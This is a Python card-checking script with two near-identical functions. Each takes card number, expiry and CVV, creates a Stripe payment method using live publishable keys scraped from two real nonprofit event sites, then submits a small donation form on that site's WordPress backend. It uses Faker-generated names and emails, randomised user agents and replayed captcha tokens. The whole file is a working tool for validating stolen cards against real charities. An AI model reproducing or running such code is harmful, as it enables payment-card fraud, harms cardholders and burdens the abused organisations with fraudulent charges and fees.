import requests,re
from user_agent import generate_user_agent
from faker import Faker


# Initialize Faker
fake = Faker()
def Tele(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
    
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': generate_user_agent(),
        }
        
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=4e2361aa-75e3-4218-b70d-85c80df5ab8e1af821&sid=0416ab85-4315-4f87-a400-a408fd43d27410fc3e&payment_user_agent=stripe.js%2F019cc90856%3B+stripe-js-v3%2F019cc90856%3B+card-element&referrer=https%3A%2F%2Fyodigonomas.com&time_on_page=44841&key=pk_live_51JHWSTEpyYL0BziiFml5ISI6sloTlcYKhKB0vqdKPNyqdU9lNu1tK3f1ADdFQnaq5XXmiaNx5ij11FduEb4rbn1a00ZuvBeaki&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoib1JDMlVxMk80M2p3N3R5SmJHd0ViK25OUzNtTllrY0Q2MlNQQjJQTGx5S0VZais5elQxU2hqVGtQNmRjdUx0bzZ4KzBibEcxVjJ0YmZDU1lEZTNvWFJNWTRrR3NKcm5SZm45WndqOUFneXZkQ00yNlJFL1pxZ3IzNFpabW5BWU1sWWtWem05VEdmS2ZsWHBXRmlMcEM1bUxDYkY0c3BuZXQ1VmJTalFsL3dYZ3F3cm52RVJTWElRZ2lvUmRZSmd2QmxJMTFiNExaY1hNRkR6T2dLWlFnYjJmQzRZckdPQndmMlYrZ01QR0hRTmJmUkZtTTlOYUVyY1dwRkw3S2Z1VGFsNnJqbDRoK0VsQ2J3blpBbEw1Tk1wNG1sOFNRWWM2aENLekNGK093Ym1DNEJVV0JYa0dlRHJmb3JCZS9ZREJNUmVmaEJHcktzSEFYUy84b3FzZDhFWlF1MTNNS3JvUGl6OHRuRkE3QXUrdkNtUVk2RnIvSk9QRnp4b1Zzbjc5a1NvcWlEOHZMNzE0MHBtWkpXWFRwbHZKMHBYSXJLT3JVd3I3MVY3NFV0UUsrMm5XN3NITGw4Q3B0L3B1VXdwUjlwQmtFSlJjWWJNdlpnK3FZc2MvQ1VaY0Z1SVhwZXdlTnVBNXBGTzBDaktPejgreTRzcCtBcW9yM1E3a21MZlk3Wmh6SWViS045b05FN29PaExSSXZwdUFJa0s2WG1icVduV2p3UHBhSEZlV2sxamRvUlp0aVZRZVA5OEN3OXpyY1F2aVFUbG9DRXFpaDJ3Y2gxbWdvd0hRWkxYOXE0RGtiMDNIWU14Szl6MzZhWVVWVWJkRVd6amRMOWh5TTc4TFQ5c3F6V3VxYmt6ZG1RSGIvcGMxejNMY1BTWVozUmVBQW80N05lcWNsQ004ajlwL2xGYXdnVHY3TktQcEF4NXJxZzlISCt6RzFKWTdja0NPRlVpQUJQZmNXK3dIODJwUjJ1NlMrKzl1WWt2QnpWeGY0ZEdhRVIwUSt6eXJtVGU5VFRwVm9yQjNTMld2ZHpFWkxqWFQxSzFCZU5jT080d3JIM0ttT0xkVkRsRVBnYTRQSU5rTFRtcm5sSDVIT2pURlJYbVpOVk02NEZhdlRZK045Qms0RkJnTTlpWXk5QWhRejZrKzRvbVpBOVRJak4zT2tHb1FVUnJDb2xjYzZBTCs5UzFwaUNRTEQrR3hsbjJEYTFWbXA2a0lYZWY3ZUZPVlpxN1BTQjVRV2U2eVFOZG1aallkemFSNFNlTUtqUkpTZU1ud1d2bkVnd1B1THlWRVJ1VXE1WWc3VkFQbUFkOUhDblNhYU5nL080d0lzUWJJWW1XTVNNbVVYRUIwTmx6L0twRVdjUG1pQXUzU0FZb3RmaGUvVW9jTWJzM0t1SlNjNDFKNFBsMFhkSlE5MFBjRnErSmhUbHY4RzliL1FMYytkSjB6V1NXQmd3cG0rb25MaHpjZENXTUJOOHN4QmxwaFZLZjE1dFpBb21NaFJsNkZDNSs0WlFWSjlWVEZjV2dVbzg0VWZEcGViS1R3Umd1VlljMTBwaXppQVEwMENYRmxPdWhsMmd4Y0tLZlRhSmdXWC9lSzRzTVpTdTVZamRnQmNTT0VLU0JtTUpYWmJ0akVvaGs1VWFhNGVBeVh1WnUrekVUeG16UHJ1WE15TkQzTFZnNDhuZm9jN29WZHFuaW1OME1CaDB5R2RFTEo5VXRIQXgrTUQ1QWZNWThsUzlJMm5OdEQzU1o0TzNSMEFMajJtVjVnV3luMGl4YWlCYkhhQlVyd1YxOEtWODNWR3B6dCtHS1E3QnY4NlY4ZElRaDRhR3h0TnJtajljZHhpNnpoaEFGZ1NHRllBN1JiTk52aWh3YVB1eG9nN3ZpSlZqN21hbFZBZi9pbkR3QWFuVnhUTkxEdTlKeFcyRnVkRXVCQmQwVTRraFduZUxScFpTalhEdURYRnEvWnVUVkN5QjBHYm9JQWRHdFlOcllHRkl2TTM1MERNWDZ0Ly9LbmlqM1RYcGVtV2p2UytaWHhKQlVNM0VUZ1VRUUtHTEt6UlpTL0YrY0ZIblFxZFh2QnUrSm50QlpHODlzdUE3ZllINlRIOFh2a0xHWmt1WU82MjVsRGlabFJ0aW10dzQ5QThVeUJFQ1lGc3RTL0FRdU5wV2lobmxxQW1kN0FQdXNhNlVPQk5ncCtqUytBMDdzem11V2RyaVRlV2NqT1NCdkFPaXdBM2ZCeGI4RXhYQnZ0eDEreTR5TWF1WGZxMHlTZEltNXB4US9KYmRLeDF2QkdoSEZWQjQ5U1ZvZ0J5cWhoWGd5S3ljZkdzRkZwMGZsWGlIT0pRQmtvdVphWS9YRUpDakhHVTI2cEtyVnNhbFpUVDB2OGRJQUhlT0dJckZhaFBUVjl4L2lSQUMxOVliRnBSM0hpOVA3bVZGZTRob0NEY3R4TDBOVG1OZG9KbUsrS3ppbituNUkvclRGaytMVS9hdmV1REpUMXpsdHJ1a05LdEZxcmVhamFyMWlvU05iclVSUURtRVgyKzBHT3NFUjJVNDFuZUJ6WXlGT0lyc0Ixa3VhaTFTUzBkMTc4N2Fuakt5d3BRbzU3WVJmaW0vMjh4MmpyeUJiazFDMk04V3h2SXpQNEpSM1BIMUd3Zmoxb2J5VSt6SUlvVk1mVDNhMmpwRU5ZN1RzVmNMN0UvbjBhQWdaWndpTVpKL2xTRXFTWWJ0ZG5kMVJkdHhoZEdnM1BRZmhwWXFjYjlrNXQ2bEN2WUtsbGM2VEtvMFo3Uko0c3BndHA3MkI2WXBhUjZQZEZ3YmlFREVKTXdRMHozazd2VDNLbGUwR3RFeXkrVWFZVzkzVFJ6alhOVWNsMlVzazFZMHdvUEdwYmhRcWIvQ1FMOVNKK0RPa3pCVmtNWis4PSIsImV4cCI6MTcyNTUyMTkxOCwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiIzZjJmZmM1ZiIsInBkIjowLCJjZGF0YSI6ImxQZWU5YUVxZHNzOWQ5M25ZV3hiNDVYandSSWxBbTBOaVNzZVVuZW4xV2MvTmlnVWU1MHAwZDUzRkF0SHhGbkRMWVNDNHBlaWZBRDNXZ0FRSjUwNlN2VDVJa0dvTjJiQ0JicTh4NFlDMlpTRy9MOW1xNGdick50ZTU0cUVkMzlVS3oxeFlLSS8vTkRueWkxK2VuK1poUE5lR1YvcHo4N09xQmVPMisrZWRCNFU4NnNNZXY4NkZVOGJ1d3lYSWl6RHpBUS8wdnA3VmN3RDRyS2wifQ.fCyAGD-evjHMNki8Z83g97hGHaBIim3UdrsKN9DEruI'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        try:     
            id = response.json()['id']
        except:
            pass
        
        
        headers = {
            'authority': 'yodigonomas.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://yodigonomas.com',
            'referer': 'https://yodigonomas.com/en/events/10-dollars/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1725521838145',
        }
        
        data = {
            'data': f'__fluent_form_embded_post_id=11244&_fluentform_68_fluentformnonce=fa25556beb&_wp_http_referer=%2Fen%2Fevents%2F10-dollars%2F&names%5Bfirst_name%5D=Mr.%20Angus%20Thiel&names%5Blast_name%5D=Ea&email={mail}&input_radio=Monthly&payment_input_1=3&payment_input_1_custom_3=1&payment_method=stripe&terms-n-condition=on&__stripe_payment_method_id={id}',
            'action': 'fluentform_submit',
            'form_id': '68',
        }
        
        r2 = requests.post(
            'https://yodigonomas.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=data
        )
        return (r2.json())
        
        
        
# Initialize Faker
fake = Faker()
def Tele1(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': generate_user_agent(),
        }
        
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=1d94c087-083e-4eea-8adc-133374f3b3c1056df3&sid=1fe07e1f-c70a-4334-ab72-ee1a1eecb07099a9d6&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+card-element&referrer=https%3A%2F%2Fwww.ninodelacaridad.com&time_on_page=68022&key=pk_live_51OHFDAD6V9VrPDWYITrtYPuIZidiK5rIQtbdfE98OcfqO4DM5MMan5NbBuSgoplkUGCgIcSoveUYuNwoe3M7cLqy00iKYJSaeB&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiRElKU0tjZzdSSW05Y1IweGxIUGhod3UxWWpMeHQ2dFl2bTBUUnlsb3VsU2FRcytQWXhBamRaRjFGbEhDWVYwbFRaR2p0emJPRUVPWjZuWmlWcjc4MXZkUEkxOXc1QkNSeDk1R0lBYXZmNEZhRG9xZSt3UExnQm9acTIyeGN6Y1V0aUN4QUhzTkQvNFhKS1RYNngvSkJqY2wzSE5TQVNnYjRtOC8xUnlQcEZSNjBjT3JlNDBxUUllcjdnWEtjMEwybjV6ajNJcUxKSW1NL0U2RG5KbXljaklLbWgvM1ZXZVdNMHMrV3paWkdkMFJkMGd2SE9heElDUlJtcDFkWVlrWnFHdmlTZXlKOHlIcDlNM0V2SkVvZ2NZakdJYUQ3TExoTlFwRUg2YmVWbk1NamFDU2FJK0kxNkJPU1BkR0QyQ0hvUmxoZEk5RUZvY2o0N28zSlRDSXczQkw0YlFQeFBkVUgxOVAydzFjWWNDK21GOVA1YTRBdkdEOVI3b21jMHp5U0YwMFdkNmNEaWF0ajR5ekowNExuL3FVWCtKcXg4U0E0dm5KWUtQRStoNnllU2V1bld2djNvbHY3Z2NGY0M1SlZic3M2L0pUUDZ3akFiZEpFWVprMzRMQk1pcVVRTmcycWdaL0NpZjRySklmMFFjZDFLYm14NytLTWdhNEpmQ2xlTTVmZHYvSE5scFB6TWh3S0U2VitnYmQ4czQ0d3VURWZELy84clJ2SGxPK3lIS3pxQnpJdkhkaWxPdFlHWWsyc1FsYkFWZ3JrK1l4dzN1VGhVSXB1VG5iT21veHB3WDR3R1pvbVB4Z3lYVkdFb3NKem4zSS9QQmNwU3hpMTNNVUFlekJ4UzhiR0dKQlhTaUNkMjlOTVIyRmZtWU9tRWxHUmtWT2w1aGVJVmVmekh1MFlzaWRvZVF6a21nRklzcm5xYzBqOGk0eVZUbjkwRUZtcTNUNklyeWlBRyt0eEVoT0dRSWl6VUtsT2ZnbkxsaVZmcHl3S2VRUnlUc3FSdnZaMk1kQnBzZ2luTlg4ZHgyVFgvSDJWT1FLdzJaMDJHdXJNbHBPdVhIWlVwTWxFYTZ3RnNVTDBOOERDNUJtY1FtWTNNRXRIdG1RRklnOE40bEE1WDNGamxLSXNVMTVweFFwS1BhcWhtWGhaZjgxeFp6dFMrSUR5ZnBIdVQ1YXVYV2QrdXgzNHNUMTRBQmdIRlFxeXcveU5PR3NYaGg0dXh2cHowVER3SU1VQjgzZXQzNWhQOHhndWltai8xWEdHTFp6UEJDR0MzVjFIVWdCRDUzWTBxUHplcjhQREpqV0REaTA1WkxNeElSbnAxR1c5OXkwQ2puY2dDck9WV0lBTkJzK0hSWFZOcGExdkhDc3FPeDJHZExValFsRExKTVk0ZTdVYXZLVDVDMzNlcCtWMnlWTUdCVVdwT1ErVVpTbUFZOUdoRnRBbWpqR0FaR09TT0t3WHIrK3VKeTBPNlJhUnRPTkRPNkZadUlvK1dCcGY5SGJoMFZueUVrcmd2YlVrQVZYUzBKbHJKcHNjNDcxbmhieGlOUU5Ca2xYZzFNYmNRc0VRcnFxNTdTK29MZ0NmWXFpZ2MrWk96cTBvMTFqcU9kL2lIS2dISWpESTlVV3NqbWF5VFlKQkxSUTFsZkVuTlJjaXl3YlFBUUlGQVIvMFU5UmtwMldjVUxLQ2tYMUpUR0Z3V3VoOHhJMktiNGF0S2VHUGhjQlRxU2FJYXZTeTRDd1VZYzhtdDNXSy9TY1d3TmdwREFFR2xlcytCL1o0eXQ2bHNCdHhtMDdsQmdneGozc2NDank3azYrdDI5eHJLNVNLOTZLNkF5VlRaWERNWmpZSEV1Tjg3d2FtM0xINVUzYlNFaE9lbGZPTFR2MmF3M0dHZnRRUFVkUWIyeXBKVE43ZDhDTHlZT0Zua0xESDFuaWhCT0RrWEVqTkpuZVIzZ2doMUs5cnVVV2VScGI1a2NDUVlEY1pvMk5jY3pIMkIzeE9mT3EwdlpPTzhqRU1CYkdYWFh1eE5mbG9rVWJRQUR0MjBVTk1aR0hKeFk0WXlqMG1UK2ZFZlphQmpBd25UclJXbS95VUZyckFkOW0wMFZxVzU5NFI0elFINWFsNFZDQnlJdDNOUHg3NG1jSFYzUmpYcWZIcklRWHlHUE95bmNGek5pZmdUbU1saTZxNUF3SzVCOHROeXlzRW9oSjNKQldPSFBnOHM3RVprRDNQYzI4eVNPOWxOb1VrenVWZlR6dmcwckx3NG0vS0dmUGlndmxsQW1QNTh1Z2plNElMRk5La3creDNtdm5BY2REY1RMSXhrU090Wkp6dmFDSjB6NXpIMlJHcDNraTNMM3BBL05jVHdBUitoMmwxeEhGOGZTSnd2T25Oc1gweDVLdkltYm1RWHhzcUJBV3BhZXRKKytoelBOOHlXRFhyTkZ5ZjkzbDlYMjFheXZhaUlRU1JNZmRQd3FQOGhaa1hReTFjN1AwdllmcXcxdDIvVnFNY1VKdFVWVlJQeDdRTktVREVXSHBkYTF3L0F1eDhFVnluQndaTHMvQzA1MXp6MU5VaGx2K3hjOEdxRUc3R0ZPQlczbUlIbmtDeURmU25GdlhoNllhVjRpYWZ3dE5tZkZzWkMyUU5admFiQkhHUVlsQlI5dnZiNkhGWFhjSWpFTUZaUzVJZEROaVhqQk9odGJNMkd2TVpjU0V0NTBkbEFsNHVDYWVDcUU0RWdiRVZUOElYazloMzh4ODcwTWE0M21OUTlDOCtLemcvQUhOcERPQmtiWHlxNFM1SklGVjI2NmhiUHBnS0oxNTZaNmFneEdVNnNrYjdJRlBTY2hVcko2OGNUbjhndVJhSVcwdGZTcXdSbzhLUjFCM0V1R3dGVTdVOE5RT01zN3k3bmE3Rmc9PSIsImV4cCI6MTcyNTYzMzMxMiwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiIxMDNlOWQwNSIsInBkIjowLCJjZGF0YSI6IjBQR0wzaDFQT3IyZ0RjNVdTeC9XVFNpRWNSTUxQNDhaNnRLTkVvaWZ2MmdHTlRFR3dkZGFqNFpaL2E0TXp0a1kxN0xmdUtpcy9uWmxxbWhuYmZVNGQ2UlVuOXo1S01obDl6OEt6d2Z3UFlRT09YeGpYYjZSY2VCOHVZTDlZZFBPR3lzQWZDQkhtTlRoQTRYcVR2ODl0bkQ1OFRmZ3RTTXh4NTNUc0VMOWs3RU5lWFMza2o4TTJyOUV0Z29PeGJvRUlmUFA4SXBGSW1veDhaWkgifQ.-oTYVedfSsxUsOGm7U2-mt7hK-COJIu1ofpILs-SfEY'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:     
            id = response.json()['id']
        except:
            pass
        
        
        
        headers = {
            'authority': 'www.ninodelacaridad.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.ninodelacaridad.com',
            'referer': 'https://www.ninodelacaridad.com/events-for-2024/latinos-destinados-a-triunfar/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1725633251190',
        }
        
        data = {
            'data': f'__fluent_form_embded_post_id=2612&_fluentform_20_fluentformnonce=34e6ab4c24&_wp_http_referer=%2Fevents-for-2024%2Flatinos-destinados-a-triunfar%2F&names%5Bfirst_name%5D=thu&names%5Blast_name%5D=ra&phone=%2B18172388000&email={mail}&payment_input=Credit%20card&payment_input_1=Custom%20Amount&custom-payment-amount_1=10&payment_method=stripe&__stripe_payment_method_id={id}',
            'action': 'fluentform_submit',
            'form_id': '20',
        }
        
        r3 = requests.post(
            'https://www.ninodelacaridad.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=data
        )
        return (r3.json())
        